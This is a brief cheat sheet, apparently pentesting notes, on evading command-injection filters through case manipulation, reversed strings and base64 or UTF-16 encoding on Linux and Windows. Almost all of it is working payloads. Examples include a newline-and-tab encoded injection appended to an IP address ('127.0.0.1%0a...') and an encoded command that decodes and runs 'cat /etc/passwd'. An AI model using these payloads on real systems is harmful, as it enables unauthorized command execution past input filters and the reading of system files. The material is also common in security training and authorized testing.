## Case Manipulation

Capitalize some or all letters

**Windows
- Case insensitive
```
WhOaMi
```

**Linux
- Case sensitive
- Must turn command into all lowercase
```
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
```
- Fails due to spaces
- %09 for tab
```
127.0.0.1%0a$(tr%09"[A-Z]"%09"[a-z]"<<<"WhOaMi")
```

## Reversed Commands

**Linux
```
echo 'whoami' | rev
$(rev<<<'imaohw')
```
- If using a character filter, we will have to reverse them too

**Windows
```
"whoami"[-1..-20] -join ''
iex "$('imaohw'[-1..-20] -join '')"
```


## Encoded Commands

**base64
```
echo -n 'cat /etc/passwd | grep 33' | base64
bash<<<$(base64%09-d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```

**Windows
```
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
```

**Linux
```
echo -n whoami | iconv -f utf-8 -t utf-16le | base64
```
